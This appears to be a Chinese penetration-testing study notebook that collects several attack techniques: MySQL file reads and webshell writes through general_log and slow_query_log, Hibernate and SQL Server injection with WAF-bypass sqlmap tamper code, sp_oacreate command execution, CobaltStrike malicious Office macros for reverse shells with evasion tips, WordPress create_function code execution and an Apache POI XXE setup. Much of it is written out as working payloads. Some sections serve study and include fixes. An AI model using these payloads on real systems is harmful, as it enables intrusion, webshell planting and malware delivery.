<p>secure_file_priv没有设置时则表示没有任何限制</p>
<p>想要成功利用load_file函数，必须设置secure_file_priv变量为空，这样读取文件也就没有限制</p>
<p>set global secure_file_priv=";</p>
<p>注意：修改secure_file_priv配置后，需要重启mysql才能生效。</p>
<p>进一步读取：etc/passwd文件</p>
<pre><code>select load_file('/etc/passwd');
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200924144404201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
读取出来后（BLOB）1.26KB，发现为BLOB二进制数据，为方便获取文件信息,</p>
<p>使用 wireshark读取 MySQL协议中的第一 Request Query信息：<br>
<img src="https://img-blog.csdnimg.cn/20200924144716772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
然后在wireshark中查看TCP流就能看到passwd信息…<br>
这是一个思路！！</p>
<h2><a id="_5059"></a>脑洞大开</h2>
<p>关于 into outfilel函数，用于写入文件进行geshell，利用该函数同样前提</p>
<pre><code>1、secure_file_ priv为空，能够写入文件

2、具备写入特定目录,如 /var/www/htm网站路径权限

3、写入的文件能够正常解析
</code></pre>
<p>另外一种思路（需要mysql roo权限）</p>
<pre><code>1、修改 general_ log的值为on，同时general_log_file修改为网站绝对路径+文件

2、在网站查询sql语句（伪造sql语句的查询一句话后门，很多情况下仅能写入php），将会向网站路径下写入sql语句，访问写入的文件，可成功getshe‖
</code></pre>
<p>总结：<br>
很多情况下碰到的实战环境特别苛刻、严格，不是像在靶机环境一样一帆风顺，往往需要灵活应对各种不同复杂环境，从中找出一条适合自己测试的方向</p>
<hr>
<h2><a id="22104_Hibernate_5085"></a>2.2.10.4 Hibernate基本注入</h2>
<p><strong>基本概念</strong></p>
<p>JDBC：提供了一组 Java API来访问关系数据库的Java程序</p>
<p>ORM：对象关系映射</p>
<pre><code>实体类与数据库表一一对应 
	
不需要操作数据库，而是操作实体类对象
</code></pre>
<p>Hibernate ：</p>
<pre><code>基于ORM的一种框架

对JDBC代码进行封裝 

开发者不需要写SQL语句就能实现对数据库进行增删改查

属于dao层 

适用于MS SQLSERVER、ORACLE、SQL、H2、Access和Mysql等多种数据库
</code></pre>
<p>参考文章：</p>
<pre><code>https://xuzhongcn.github.io/hibernate/01/Hibernate01.html  --详细介绍
https://www.cnblogs.com/-qing-/p/11650774.html   --注入攻击
https://cloud.tencent.com/developer/article/1035345   --注入攻击
</code></pre>
<hr>
<p><strong>这里对于Hibernate注入提几个思路点：</strong></p>
<p><strong>#添加操作代码</strong></p>
<p>使用save，不太可能会出现拼接漏洞</p>
<p>因此在添加、创建操作下，Hibernate大概率不会出现注入漏洞</p>
<pre><code>Usertestusertest=new Usertest();
usertest.setUsername(username);
usertest.setPassword(password); 

session.save(usertest); 
</code></pre>
<p><strong>#查询操作代码</strong></p>
<pre><code>createQuery容易岀现拼接漏洞 

实际上，比较容易出现漏洞的是在 like '%xxx%'、 order by xxx这种语句中
修改操作和删除操作代码中如果存在**査询操作代码**，也有可能岀现拼接漏洞
</code></pre>
<p><strong>#Hibernate支持输入</strong></p>
<pre><code>and or 

database() user() version() ascii() 
</code></pre>
<p>假设开发者未进行过滤，则可存在万能密码</p>
<pre><code>1' or '1'='1 

1' or user() like '%root%
</code></pre>
<p><strong>#Hibernate不支持输入 union/select</strong></p>
<p>因此无法进行爆库</p>
<p><strong>#暴露路径 com.springboottest.teston.security.module.Usertest</strong></p>
<p>Usertest是定义用户的类，其与数据库中的用户数据表一一对应，因此很有可能就是数据表名</p>
<p><strong>#猜解字段名</strong></p>
<p>password是另一字段名，因此输入以下语句并未报错</p>
<pre><code>1' or password='2
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200924154502889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
password1是不存在的字段名，因此输入以下语句报错</p>
<pre><code>1' or password1='2
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200924154539945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="22105_mysql_general_log_fileslow_query_log_file_5185"></a>2.2.10.5 mysql 利用general_log_file、slow_query_log_file写文件</h2>
<p>高版本的mysql中，一般默认配置了–secure_file_priv为null限制了文件写入，这时，可以通过mysql的general_log_file、slow_query_log_file来尝试写文件</p>
<p><strong>general_log_file</strong></p>
<pre><code>set global general_log='on'
SET global general_log_file='D:/phpstudy/www/1.php';
SELECT '&lt;?php assert($_POST["cmd"]);?&gt;';
set global general_log='off'; 		//切记关闭
</code></pre>
<p><strong>slow_query_log_file</strong><br>
用到了mysql的慢查询，全名是慢查询日志，是MySQL提供的一种日志记录，用来记录在 MySQL中响应时间超过阀值的语句。开启之后默认阀值是10s，可以更改此时间</p>
<pre><code>set global slow_query_log=on; 
set global slow_query_log_file="C:\\phpstudy\\PHPTutorial\\www\\3.php
select sleep(15)，'&lt;?php assert($_POST["cmd"]);?&gt;'
set global slow_query_log=off
</code></pre>
<p>参考文章：另外的思路</p>
<pre><code>https://www.k0rz3n.com/2018/10/21/Mysql%20在渗透测试中的利用/    --general_log_file利用写入shell
https://www.cnblogs.com/-mo-/p/11677621.html    --slow_query_log_file利用方法
</code></pre>
<hr>
<h2><a id="22106_SQL_Server_Getshell__5216"></a>2.2.10.6 SQL Server注入 Getshell 有趣案例</h2>
<p>这里感谢倾旋大佬的思路分享<br>
倾旋大佬博客：<code>https://payloads.online/posts/</code><br>
参考我之前写的一篇文章：<a href="https://payloads.online/archivers/2019-07-19/1">某次项目技术点实录-Regsvr32 ole对象</a></p>
<p><strong>0x01 前言</strong></p>
<p>本文非基础类的普及文章，主要分享内网中遇到的一个有趣案例。</p>
<p><strong>0x02 Bypass注入点</strong></p>
<p>通常情况下，遇到SQL Server注入点，我会比较关注是否是DBA权限，如果是，那么就可能拿到执行命令的权限，进而反弹到Ｃ2上，方便后续的后渗透工作。</p>
<p>一开始在一处比较复杂的功能点发现了SQL Server的注入，也是首先利用AND进行判断：<br>
<img src="https://img-blog.csdnimg.cn/20200924161931229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参数：ModuleType存在注入点，但是后面有一层站点全局输入的检测机制，从简单的测试来看，是不存在语法分析的一种，比较容易绕过。</p>
<p>我尝试了以下方案：</p>
<pre><code>and -&gt; And
and -&gt; /**/And
and -&gt; /*xsww!s*/And
and -&gt; /*xswwS1154-_[0)}!s*/And
and -&gt; /***/And
</code></pre>
<p>最终发现第五种可以绕过，使得后端无法辨别<code>/***/</code>是否和And是一个本体。</p>
<p>那么我猜想到了一个简单的表达式，似乎和这个过滤规则比较相向：<code>/*\w{0,}*/</code><br>
<img src="https://img-blog.csdnimg.cn/20200924162213167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>0x03 tamper 自动化实现</strong></p>
<p>这里直接改了以下space2comment.py，这个脚本在Kali Linux中的sqlmap目录下：</p>
<p><img src="https://img-blog.csdnimg.cn/2020092416225828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="2020-01-03-13-13-37"></p>
<p>核心代码：</p>
<pre><code>for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**/"
                continue
</code></pre>
<p>只需要替换/**/即可：<br>
<img src="https://img-blog.csdnimg.cn/20200924162336894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
接着，就可以跑出注入了~</p>
<p>PS：我比较习惯于添加<code>--random-agent</code>参数，理由是在注入的过程中，避免被流量感知设备发现。<br>
<img src="https://img-blog.csdnimg.cn/20200924162402359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x04 xp_cmdshell</strong></p>
<p>到这一步的时候，我遇到了一个问题，SQLMAP调用exec master…xp_cmshell的时候被拦截了，因为后端还检测是否有<code>exec、master</code>，于是我还要将tamper加两句：</p>
<pre><code>payload = payload.replace("exec","/***/Execute/***/")
payload = payload.replace("master..","/***//***/")
</code></pre>
<p>最终结果：<code>/***/execute/***//***/xp_cmdshell/***/'whoami'</code></p>
<p>点击发包，还是无法执行，被360拦截了！<br>
<img src="https://img-blog.csdnimg.cn/2020092416245593.png#pic_center" alt="在这里插入图片描述"><br>
这个Error Code 5 ，是Windows的错误代码，中文意思就是：“拒绝访问”。</p>
<p>现在xp_cmdshell被拦截的很多了，但是sp_oacreate应该可以使用的：</p>
<p>参考我之前写的一篇文章：<a href="https://payloads.online/archivers/2019-07-19/1">Regsvr32 ole对象</a></p>
<pre><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
</code></pre>
<p>后续我发现该服务器无法出网，还是站库分离</p>
<p>因此无法执行操作系统命令</p>
<p><strong>0x05 写入文件</strong></p>
<p>在写文件这块，我浪费了大量的时间，首先要确定能否向站点目录写文件，当前写文件的操作是否被拦截等等因素。</p>
<p>一开始的思路是调用xp_cmdshell，采用echo去写，目前已无法执行命令，就此作罢，吸了一口芙蓉王，精神焕发，遂查到数据库备份的方式。</p>
<p>提交：</p>
<pre><code>{"ClientType": "", "ClientGuid": "09a37ee1-5ec3-46db-9279-4cb066622e8d", "ModuleType": "A2501';use test222;create table [dbo].[test2] ([cmd] [image]);insert/***/into/***/test2(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);backup database test222 to disk='C:\test2.bak' WITH DIFFERENTIAL,FORMAT;-- ", "IsBackEnd": false }
</code></pre>
<p>页面返回正常。</p>
<p>但是，我的站点目录如果是中文呢？在Burp里处理就非常麻烦！</p>
<p>还记得之前的IIS 7.5吗，IIS在接收到一个请求后，会自动将数据进行Unicode解码，如果流量设备、WAF不支持此特性的话，就可以进行绕过，这里我着重解决中文目录的问题。<br>
<img src="https://img-blog.csdnimg.cn/20200924162625760.png#pic_center" alt="在这里插入图片描述"></p>
<p>到这此文就结束了，我并没有成功Getshell，只是回顾我解决问题的思维方式，希望能对大家有用！</p>
<p>倾旋大佬文章：</p>
<pre><code>https://payloads.online/archivers/2020-01-01/3
</code></pre>
<hr>
<h2><a id="2211__5334"></a>2.2.11 文件读取漏洞</h2>
<pre><code>https://xz.aliyun.com/t/6594
</code></pre>
<h2><a id="2212_Pentesterlab_Xss_5340"></a>2.2.12 Pentesterlab Xss</h2>
<pre><code>https://pentesterlab.com/  --官网
https://download.vulnhub.com/pentesterlab/web_for_pentester_i386.iso  --安装包
</code></pre>
<pre><code>https://blog.csdn.net/he_and/article/details/79798958
https://www.andseclab.com/2018/11/11/pentesterlab-xss题解/
http://secpark.com.cn/articles/2018/05/28/1527502530234.html   --很直观
</code></pre>
<p>三篇大佬文章详细讲解了pentesterlab靶机进行XSS渗透！！！</p>
<hr>
<h2><a id="2213_Office_5355"></a>2.2.13 Office宏的基本利用</h2>
<p><strong>前言</strong></p>
<p>Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。而宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上</p>
<p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本</p>
<p><strong>环境准备</strong></p>
<pre><code>Windows 7 x64 旗舰版
Microsoft Office 2016
CobaltStrike 3.14
</code></pre>
<p><strong>CobaltStrike生成宏</strong><br>
先利用CobaltStrike生成宏payload，接下来只要放入word、excel或ppt即可<br>
<img src="https://img-blog.csdnimg.cn/20200924170308533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>创建宏Word</strong><br>
打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定”<br>
<img src="https://img-blog.csdnimg.cn/20200924170340709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
编写主体内容后，点击 “开发工具 — Visual Basic” 。<br>
<img src="https://img-blog.csdnimg.cn/20200924170409617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
双击 “ThisDocument” ，将原有内容全部清空，然后将CobaltStrike生成宏payload全部粘贴进去，保存并关闭该 VBA 编辑器<br>
<img src="https://img-blog.csdnimg.cn/20200924170430919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
另存为的Word类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码<br>
<img src="https://img-blog.csdnimg.cn/20200924170451629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>反弹Beacon shell</strong><br>
默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知<br>
<img src="https://img-blog.csdnimg.cn/20200924170517584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
诱导目标手动点击”启用内容”宏。<br>
<img src="https://img-blog.csdnimg.cn/20200924170540217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
目标一旦启用，CobaltStrike的Beacon就会上线，即成功接收到Shell<br>
<img src="https://img-blog.csdnimg.cn/20200924170605782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
宏代码分析<br>
CobaltStrike生成默认的VBA会导入四个Windows API函数，常见的ShellCode加载器代码：<br>
<img src="https://img-blog.csdnimg.cn/2020092417062862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>CreateRemoteThread 创建一个在其它进程地址空间中运行的线程(也称:创建远程线程).
VirtualAllocEx 指定进程的虚拟空间保留或提交内存区域
WriteProcessMemory 写入某一进程的内存区域
CreateProcess 创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件
</code></pre>
<p>其中<code>Array(-4,-24,-119,0,0,0,96,-119,-27...</code>就是ShellCode，混淆的办法有很多种</p>
<p>ShellCode可以自己在VBA里解码或者比如每个元素自增1，运行的时候-1，达到免杀 ……</p>
<p>参考文章：</p>
<pre><code>https://zhuanlan.zhihu.com/p/98526727    --感谢我不是大神的文章
</code></pre>
<hr>
<h2><a id="2214_Javasecuritycalendar2019CandyCane_5409"></a>2.2.14 Java-security-calendar-2019-Candy-Cane</h2>
<p>官网：</p>
<pre><code>https://www.ripstech.com/java-security-calendar-2019/
</code></pre>
<pre><code>https://www.leadroyal.cn/?p=914      --9102年Java里的XXE
https://www.leadroyal.cn/?p=930	  --9102年Java里的XXE的防御
https://xz.aliyun.com/search?keyword=Java+Security+2019   ---Ripstech Java Security 2019 Calendar复现系列(1-4)
</code></pre>
<p>这里还有更好的文章，没找到！！！！需要回看！！！</p>
<hr>
<h2><a id="2215_Discuz_Ssrf_Rce_5424"></a>2.2.15 Discuz Ssrf Rce漏洞分析报告</h2>
<p>很老的一个漏洞了</p>
<pre><code>https://cloud.tencent.com/developer/article/1511949     ---复现

https://xz.aliyun.com/t/2018			---Discuz!因Memcached未授权访问导致的RCE

https://cn-sec.com/archives/76754.html   	---https://cn-sec.com/archives/76754.html

https://www.freebuf.com/vuls/191698.html		---Discuz x3.4前台SSRF漏洞分析

https://hackmd.io/@Lhaihai/H1B8PJ9hX    --SSRF集合笔记
</code></pre>
<p>有一篇很古老的经典文章，硬是没找到！！！只能书里看了</p>
<hr>
<h2><a id="2216_WordPress_5441"></a>2.2.16 WordPress语言文件代码执行漏洞分析</h2>
<p><strong>0x00 漏洞概述</strong></p>
<p><strong>1、漏洞简介</strong></p>
<p>WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统，在 github （https://gist.github.com/anonymous/908a087b95035d9fc9ca46cef4984e97）上爆出这样一个漏洞，在其&lt;=4.6.1版本中，如果网站使用攻击者提前构造好的语言文件来对网站、主题、插件等等来进行翻译的话，就可以执行任意代码</p>
<p><strong>2、漏洞影响</strong></p>
<p>任意代码执行，但有以下两个前提：</p>
<pre><code>攻击者可以上传自己构造的语言文件，或者含有该语言文件的主题、插件等文件夹

网站使用攻击者构造好的语言文件来对网站、主题、插件等进行翻译
</code></pre>
<p>这里举一个真实场景中的例子：攻击者更改了某个插件中的语言文件，并更改了插件代码使插件初始化时使用恶意语言文件对插件进行翻译，然后攻击者通过诱导管理员安装此插件来触发漏洞</p>
<p><strong>3、影响版本</strong></p>
<pre><code>&lt;= 4.6.1
</code></pre>
<p><strong>0x01 漏洞复现</strong></p>
<p><strong>1、环境搭建</strong></p>
<pre><code>docker pull wordpress:4.6.1  
docker pull mysql  
docker run --name wp-mysql -e MYSQL_ROOT_PASSWORD=hellowp -e MYSQL_DATABASE=wp -d mysql  
docker run --name wp --link wp-mysql:mysql -d wordpress 
</code></pre>
<p><strong>2、漏洞分析</strong></p>
<p>首先我们来看这样一个场景：<br>
<img src="https://img-blog.csdnimg.cn/20200924214723150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在调用<code>create_function</code>时，我们通过 <code>}</code> 将原函数闭合，添加我们想要执行的内容后再使用<code>/*</code>将后面不必要的部分注释掉，最后即使我们没有调用创建好的函数，我们添加的新内容也依然被执行了。之所以如此，是因为<code>create_function</code>内部使用了<code>eval</code>来执行代码，我们看PHP手册上的说明：<br>
<img src="https://img-blog.csdnimg.cn/20200924214956957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
所以由于这个特性，如果我们可以控制<code>create_function</code>的<code>$code</code>参数，那就有了任意代码执行的可能。这里要说一下，<code>create_function</code>这个漏洞最早由80sec在08年提出，这里提供几个链接作为参考：</p>
<pre><code>https://www.exploit-db.com/exploits/32416/
https://bugs.php.net/bug.php?id=48231
http://www.2cto.com/Article/201212/177146.html
</code></pre>
<p>接下来我们看Wordpress中一处用到<code>create_function</code>的地方，在<code>wp-includes/pomo/translations.php</code>第203-209行：</p>
<pre><code>/**
 * Makes a function, which will return the right translation index, according to the
 * plural forms header
 * @param int    $nplurals
 * @param string $expression
 */function make_plural_form_function($nplurals, $expression) {  
    $expression = str_replace('n', '$n', $expression);
    $func_body = "
        \$index = (int)($expression);
        return (\$index &lt; $nplurals)? \$index : $nplurals - 1;";
    return create_function('$n', $func_body);
}
</code></pre>
<p>根据注释可以看到该函数的作用是根据字体文件中的<code>plural forms</code>这个header来创建函数并返回，其中<code>$expression</code>用于组成<code>$func_body</code>，而<code>$func_body</code>作为<code>$code</code>参数传入了<code>create_function</code>，所以关键是控制<code>$expresstion</code>的值。</p>
<p>我们看一下正常的字体文件<code>zh_CN.mo</code>，其中有这么一段：<br>
<img src="https://img-blog.csdnimg.cn/20200924215112117.png#pic_center" alt="在这里插入图片描述"><br>
<code>Plural-Froms</code>这个header就是上面的函数所需要处理的，其中<code>nplurals</code>的值即为<code>$nplurals</code>的值，而<code>plural</code>的值正是我们需要的<code>$expression</code>的值。所以我们将字体文件进行如下改动：<br>
<img src="https://img-blog.csdnimg.cn/20200924215150309.png#pic_center" alt="在这里插入图片描述"><br>
然后我们在后台重新加载这个字体文件，同时进行动态调试，可以看到如下情景：<br>
<img src="https://img-blog.csdnimg.cn/20200924215203607.png#pic_center" alt="在这里插入图片描述"><br>
我们payload中的<code>)</code>首先闭合了前面的<code>(</code>，然后<code>；</code>结束前面的语句，接着是我们的一句话木马，然后用<code>/*</code>将后面不必要的部分注释掉，通过这样，我们就将payload完整的传入了<code>create_function</code>，在其创建函数时我们的payload就会被执行，由于访问每个文件时都要用这个对字体文件解析的结果对文件进行翻译，所以我们访问任何文件都可以触发这个payload：<br>
<img src="https://img-blog.csdnimg.cn/20200924215247446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200924215255956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
其中访问<code>index.php?c=phpinfo();</code>的函数调用栈如下：<br>
<img src="https://img-blog.csdnimg.cn/20200924215322771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x02 修复方案</strong></p>
<p>下载官方发布的补丁打上，建议管理员增强安全意识，不要使用来路不明的字体文件、插件、主题等等</p>
<p>对于开发者来说，建议对<code>$expression</code>中的特殊符号进行过滤，例如：</p>
<pre><code>$not_allowed = array(";", ")", "}");
$experssion = str_replace($not_allowed, "", $expression);
</code></pre>
<p>参考：</p>
<pre><code>https://www.seebug.org/vuldb/ssvid-92459

https://gist.github.com/anonymous/908a087b95035d9fc9ca46cef4984e97

http://php.net/manual/zh/function.create-function.php

https://www.exploit-db.com/exploits/32416/

https://bugs.php.net/bug.php?id=48231

http://www.2cto.com/Article/201212/177146.html

https://codex.wordpress.org/InstallingWordPressinYourLanguage
</code></pre>
<pre><code>https://cloud.tencent.com/developer/article/1078451   --正文，感谢
</code></pre>
<hr>
<h2><a id="2217_Struts2s2048_5551"></a>2.2.17 Struts2远程命令执行s2-048漏洞分析报告</h2>
<pre><code>https://www.ichunqiu.com/course/58753   --春秋视频讲解

http://blog.topsec.com.cn/strutss2-048远程命令执行漏洞分析/  --阿尔法实验室

https://www.freebuf.com/vuls/140410.html   --复现
https://www.jianshu.com/p/05efdc8f4301  --复现
https://www.jianshu.com/p/356291fb26a2  --复现

https://www.zybuluo.com/Dukebf/note/821989   --strut2各版本漏洞信息整理
</code></pre>
<p>很老的一个漏洞了…学习下思路~~</p>
<hr>
<h2><a id="2218_phpD_5567"></a>2.2.18 静态免杀php一句话（已过D盾，河马，安全狗）</h2>
<pre><code>https://www.cnblogs.com/ABKing/p/13515014.html  --2020年8月最新一句话木马免杀（截止2020年8月16日通杀D盾、安全狗，微步，webshellKiller）

https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug  --2020年8月如何优雅的隐藏你的webshell
</code></pre>
<p>还有很多方法，这里书籍上的方法未找到，可看书！！</p>
<hr>
<h2><a id="2219__5577"></a>2.2.19 金融信息系统安全测评方法（不公布！）</h2>
<pre><code>http://www.djbh.net/webdev/file/webFiles/File/jsbz/201232310276.pdf   ---信息安全技术信息安全风险评估规范

http://www.djbh.net/webdev/file/webFiles/File/zcbz/201226173039.pdf   ---信息安全技术信息系统安全管理要求
</code></pre>
<p>学习下就好！！！</p>
<p>随着大数据、云计算、人工智能及区块链等新兴技术的应用,银行业手机银行、微信银行等新兴数字化金通过安全测评过程，全面分析出信息系统可能存在的人为破坏场景及其成因与后果，通过科学有效的测试</p>
<p>所以才提起金融信息系统安全测评方法这块内容的警惕，这里只能看书，网上应该是封了大部分资料<s>书内容很全</s>！！</p>
<hr>
<h2><a id="2220_ApachePoiXXEAnalysis_5591"></a>2.2.20 Apache-Poi-XXE-Analysis</h2>
<p>复现CVE-2019-12415、CVE-2014-3529</p>
<p><strong>0x01 概述</strong></p>
<p>apache poi 这个组件实际上在 java 应用中蛮常见的，这个组件主要用在 word 文档或者 excel 文件导入的业务场景下使用。众所周知，这些文档实际上也是一个类似压缩包一类的存在，所以今天就看看这个东西。</p>
<p><strong>0x02 漏洞分析</strong></p>
<h2><a id="CVE20143529_5600"></a>CVE-2014-3529</h2>
<p>apache poi 在3.10.1之前存在XXE漏洞</p>
<p><strong>漏洞场景搭建</strong></p>
<p>测试代码</p>
<pre><code>import org.apache.poi.EncryptedDocumentException;
import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.WorkbookFactory;
import java.io.FileInputStream;
import java.io.IOException;
public class CVE20143529 {
    public static void main(String[] args) throws IOException, EncryptedDocumentException, InvalidFormatException {
        Workbook wb1 = WorkbookFactory.create(new FileInputStream("test.xlsx"));
        Sheet sheet = wb1.getSheetAt(0);
        System.out.println(sheet.getLastRowNum());
    }
}
</code></pre>
<pre><code>//pom.xml
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;groupId&gt;com.apache.poi&lt;/groupId&gt;
    &lt;artifactId&gt;xxe&lt;/artifactId&gt;
    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
            &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt;
            &lt;version&gt;3.10-FINAL&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

&lt;/project&gt;
</code></pre>
<p><strong>漏洞复现</strong></p>
<p>修改 excel 文件中的 [Content_Types].xml 、 /xl/workbook.xml 、 /xl/worksheets/shee1.xml 中均可添加 xxepayload 触发漏洞，我选择在 [Content_Types].xml 文件中添加<br>
